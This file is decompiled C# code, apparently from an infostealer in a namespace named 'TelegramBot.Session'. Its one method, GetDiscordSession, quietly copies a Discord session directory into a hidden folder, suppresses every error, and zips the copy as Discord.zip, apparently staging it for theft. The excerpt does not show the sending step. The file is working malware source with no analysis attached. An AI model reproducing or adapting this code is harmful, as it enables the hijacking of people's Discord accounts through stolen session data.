using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace TelegramBot.Session
{
	// Token: 0x020000FB RID: 251
	internal class CopyDiscordSession
	{
		// Token: 0x0600035A RID: 858 RVA: 0x00026A64 File Offset: 0x00024C64
		public static async Task GetDiscordSession(string Expansion, string From, string To, bool True = true)
		{
			try
			{
				if (Directory.Exists(From) && !Directory.Exists(To))
				{
					Directory.CreateDirectory(To);
					foreach (string text in Directory.GetFiles(From, Expansion))
					{
						try
						{
							File.Copy(text, Path.Combine(To, Path.GetFileName(text)));
						}
						catch
						{
						}
					}
					foreach (string text2 in Directory.GetDirectories(From, Expansion, SearchOption.AllDirectories))
					{
						try
						{
							Directory.CreateDirectory(text2.Replace(From, To));
						}
						catch
						{
						}
					}
					foreach (string text3 in Directory.GetFiles(From, Expansion, SearchOption.AllDirectories))
					{
						try
						{
							File.Copy(text3, text3.Replace(From, To), True);
						}
						catch
						{
						}
					}
					Thread.Sleep(500);
					Archive.Zip(Folders.hidenfolder + "\\Discord.zip", Folders.hidenfolder + "\\DSession");
				}
			}
			catch
			{
			}
		}
	}
}
